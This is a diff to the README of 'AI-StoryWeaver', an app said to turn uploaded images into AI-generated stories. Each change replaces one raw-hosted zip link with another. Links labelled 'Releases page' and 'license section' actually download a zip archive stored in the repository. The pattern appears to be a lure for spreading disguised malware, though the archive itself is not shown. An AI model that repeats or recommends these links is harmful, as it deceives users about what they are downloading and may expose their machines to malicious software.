@@ -6,7 +6,7 @@ Welcome to AI-StoryWeaver! This application allows you to upload images and witn
 
 ## 📥 Download AI-StoryWeaver
 
-[![Download AI-StoryWeaver](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip%20Now-Get%20the%https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip)](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip)
+[![Download AI-StoryWeaver](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip%20Now-Get%20the%https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip)](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip)
 
 To get started, click the link above to visit the Releases page where you can download the latest version of AI-StoryWeaver.
 
@@ -30,7 +30,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. Open your web browser.
-2. Visit the [Releases page](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip).
+2. Visit the [Releases page](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip).
 3. Locate the latest version, which is marked clearly.
 4. Click on the appropriate file based on your operating system to initiate the download.
 5. Once downloaded, locate the file in your Downloads folder.
@@ -66,7 +66,7 @@ Currently, an internet connection is required for both image uploads and AI serv
 
 ## 📄 License
 
-AI-StoryWeaver is open source and free to use. For detailed information about the license and contributions, please visit the [repository's license section](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip).
+AI-StoryWeaver is open source and free to use. For detailed information about the license and contributions, please visit the [repository's license section](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip).
 
 ## 🔗 Learn More
 
@@ -74,4 +74,4 @@ We’re continuously improving AI-StoryWeaver. Check back often for updates and 
 
 For additional support, feel free to contact us via the issues section of the repository.
 
-[Download AI-StoryWeaver](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/boustrophedon/AI-StoryWeaver.zip) to begin your journey of creative storytelling today!
+[Download AI-StoryWeaver](https://raw.githubusercontent.com/Anshudeshmukh14/AI-StoryWeaver/main/assets/A-Story-Weaver-3.5-alpha.3.zip) to begin your journey of creative storytelling today!
